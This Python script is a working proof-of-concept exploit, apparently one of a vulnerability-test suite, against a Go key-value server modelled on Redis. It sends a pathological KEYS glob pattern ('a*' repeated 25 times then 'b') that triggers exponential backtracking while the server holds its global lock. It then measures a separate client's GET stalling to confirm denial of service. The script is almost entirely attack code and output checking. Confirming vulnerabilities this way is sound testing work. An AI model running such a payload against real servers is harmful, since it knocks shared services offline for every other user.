#!/usr/bin/env python3
"""
PoC #5: Pathological KEYS glob pattern -> algorithmic-complexity DoS
-------------------------------------------------------------------
Location: cmdKeys() in session.go, which calls stringMatch()/stringMatchLen()
in glob.go. The matcher is a faithful port of Redis's recursive
stringmatchlen(): every '*' recurses over all remaining positions, with no
memoization and no complexity guard. A pattern with many '*' segments matched
against a long, non-matching key backtracks exponentially — and because
cmdKeys() runs while HOLDING THE GLOBAL KEYSPACE LOCK, that CPU burn stalls
every other client, not just the attacker.

CONFIRMATION IS BY BYSTANDER IMPACT, NOT BY THE ATTACK REQUEST'S OWN LATENCY. A
slow KEYS on the attacker's own connection only proves the attacker waited; it
does NOT prove denial of service. So the verdict here is judged solely on a
SEPARATE, ordinary "bystander" connection:

  1. Seed one key whose NAME is a long run of 'a' (so the pattern never
     matches and the matcher explores the full exponential tree).
  2. Baseline the bystander: time a plain GET on a second connection while the
     server is idle (sub-millisecond — GET takes the keyspace lock briefly).
  3. Launch the pathological KEYS 'a*a*...*b' on the attacker connection.
  4. WHILE it runs, time the SAME bystander GET again. Because GET must take the
     global keyspace lock that KEYS is holding, the bystander stalls.

WHY THIS IS FAST (AND HARDWARE-INDEPENDENT). The exponential blowup here is
astronomical: `a*` × STARS against KEYLEN 'a's explores billions+ of branches,
so on ANY hardware the single crafted KEYS holds the global lock FAR longer than
our few-second observation window and never returns within it. That means we do
NOT — and must not — wait for the attack to finish to prove the DoS. The proof
is complete the instant a bystander is denied timely service: we fire the KEYS,
watch one ordinary GET stall past a large absolute+relative margin (or time
out), and return. The attacker's KEYS is left pegging its core under the lock;
because #5 is the last PoC in the suite, the compose teardown reaps it. This is
what keeps the test to a few seconds instead of blocking for the (effectively
unbounded) scan — the old "wait for the scan / bystander to unblock" shape hit
the harness per-PoC cap and was misread as could-not-run.

Pass ONLY if the bystander GET is degraded by a large factor vs. its idle
baseline (or times out) — i.e. a normal client was actually denied timely
service. If the bystander stays fast across every probe, the matcher didn't
block the shared lock and this prints "not a full DoS" and exits non-zero.

Run: python3 05_keys_glob_dos.py [host] [port]
"""
import os
import socket
import sys
import threading
import time
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 6379
# If a harness has configured real auth (fixing vuln #1), authenticate both
# connections below so this PoC keeps testing #5 (KEYS ReDoS) in isolation.
REQUIREPASS = os.environ.get("KVS_REQUIREPASS", "")

# The pattern is sized so the exponential scan is effectively unbounded on ANY
# hardware — even a very fast CPU cannot finish it within the observation window
# below, so the bystander is reliably starved for the whole window rather than
# racing a scan that might complete early on fast hosts. (At STARS=15 the scan
# finished in ~1.8s on a fast dev box; each added '*' multiplies the work by
# ~KEYLEN, so STARS=25 puts completion far past any realistic window.)
STARS = 25          # number of '*' segments in the pathological pattern
KEYLEN = 30         # length of the all-'a' key name

# Observation window. The attack scan is effectively unbounded, so these cap the
# WHOLE test regardless of host speed: a single bystander GET may stall at most
# OBSERVE_TIMEOUT, and we take at most ATTEMPTS probes (the extra probes only
# absorb the rare case where the attacker's KEYS hasn't grabbed the lock yet on
# a heavily loaded box). Worst case ≈ ATTEMPTS * OBSERVE_TIMEOUT seconds.
OBSERVE_TIMEOUT = 3   # per-probe cap on the bystander GET (seconds)
ATTEMPTS = 3          # bystander probes before concluding the lock never blocked
SETTLE = 0.3          # let the pathological KEYS acquire the global lock first

# Bystander must be degraded by at least this factor vs. its idle baseline, and
# by at least this many ms in absolute terms, to count as denied service. A GET
# that hits OBSERVE_TIMEOUT (thousands of ms vs. a sub-ms baseline) trivially
# clears both bars; these only matter if it returns early but slow.
DEGRADE_FACTOR = 20
DEGRADE_ABS_MS = 250


def encode(*parts):
    out = b"*%d\r\n" % len(parts)
    for p in parts:
        p = p.encode() if isinstance(p, str) else p
        out += b"$%d\r\n%s\r\n" % (len(p), p)
    return out


def read_full_reply(f):
    """Parse exactly one complete RESP reply from a buffered file object."""
    line = f.readline()
    if not line:
        raise ConnectionError("connection closed")
    t, body = line[:1], line[1:].strip()
    if t in (b"+", b"-", b":"):
        return line
    if t == b"$":
        n = int(body)
        if n < 0:
            return line
        data = f.read(n + 2)  # payload + CRLF
        return line + data
    if t == b"*":
        n = int(body)
        out = line
        for _ in range(max(n, 0)):
            out += read_full_reply(f)
        return out
    return line


def cmd(sock, f, *parts, timeout=None):
    if timeout is not None:
        sock.settimeout(timeout)
    sock.sendall(encode(*parts))
    return read_full_reply(f)


def main():
    token = uuid.uuid4().hex[:8]
    bigkey = "a" * KEYLEN
    pattern = "a*" * STARS + "b"   # never matches an all-'a' key
    marker = f"marker:{token}"

    # Attacker connection: seeds keys and fires the pathological KEYS.
    a = socket.create_connection((HOST, PORT), timeout=10)
    af = a.makefile("rb")
    if REQUIREPASS:
        cmd(a, af, "AUTH", REQUIREPASS)
    cmd(a, af, "SET", bigkey, "1")
    cmd(a, af, "SET", marker, "1")

    # Bystander connection: an ordinary second client. Baseline its GET latency
    # while the server is idle (GET briefly takes the global keyspace lock).
    b = socket.create_connection((HOST, PORT), timeout=10)
    bf = b.makefile("rb")
    if REQUIREPASS:
        cmd(b, bf, "AUTH", REQUIREPASS)
    samples = []
    for _ in range(5):
        t = time.perf_counter()
        cmd(b, bf, "GET", marker, timeout=5)
        samples.append((time.perf_counter() - t) * 1000)
    baseline_ms = min(samples)
    print(f"[*] bystander idle GET baseline    -> {baseline_ms:.2f} ms")

    # Fire the pathological KEYS on the attacker connection in the background and
    # DO NOT wait for it: the exponential scan is effectively unbounded, so it
    # holds the global lock for the whole observation window on any hardware.
    def run_attack():
        try:
            cmd(a, af, "KEYS", pattern, timeout=OBSERVE_TIMEOUT * ATTEMPTS + 30)
        except (socket.timeout, OSError, ConnectionError):
            pass

    th = threading.Thread(target=run_attack, daemon=True)
    th.start()
    print(f"[*] fired pathological KEYS '{pattern[:12]}...' (held under the global lock)")
    time.sleep(SETTLE)  # let the pathological KEYS acquire the global lock first

    # THE MEASUREMENT THAT MATTERS: an ordinary bystander GET now, while KEYS
    # holds the lock. It must take the same global keyspace lock, so it stalls.
    # We probe up to ATTEMPTS times and conclude the moment one probe is denied;
    # the extra probes only cover the rare loaded-box case where the attacker's
    # KEYS hadn't yet grabbed the lock at the first probe. We never block for the
    # scan itself — the proof is the stall, not the scan's completion.
    threshold_ms = max(DEGRADE_ABS_MS, DEGRADE_FACTOR * max(baseline_ms, 1e-4))
    for i in range(1, ATTEMPTS + 1):
        t = time.perf_counter()
        try:
            cmd(b, bf, "GET", marker, timeout=OBSERVE_TIMEOUT)
            blocked_ms = (time.perf_counter() - t) * 1000
            print(f"[*] bystander GET during attack #{i} -> {blocked_ms:.0f} ms")
            if blocked_ms > threshold_ms:
                factor = blocked_ms / max(baseline_ms, 1e-4)
                _confirm(factor_str=f"{factor:.0f}x")
                return 0
        except socket.timeout:
            print(f"[*] bystander GET during attack #{i} -> TIMED OUT "
                  f"(> {OBSERVE_TIMEOUT}s, fully denied)")
            _confirm(factor_str="inf")
            return 0

    a.close()
    b.close()
    print("[-] Bystander GET was not meaningfully degraded during the KEYS scan — "
          "the shared lock did not block other clients. NOT a full DoS.")
    return 1


def _confirm(factor_str):
    print(f"[+] Confirmed by bystander impact: a separate client's GET was denied "
          f"timely service ({factor_str} slower than its idle baseline) while a single "
          f"crafted KEYS pattern held the global keyspace lock and pegged a CPU core "
          f"— algorithmic-complexity denial of service, not just a slow attacker.")


if __name__ == "__main__":
    sys.exit(main())
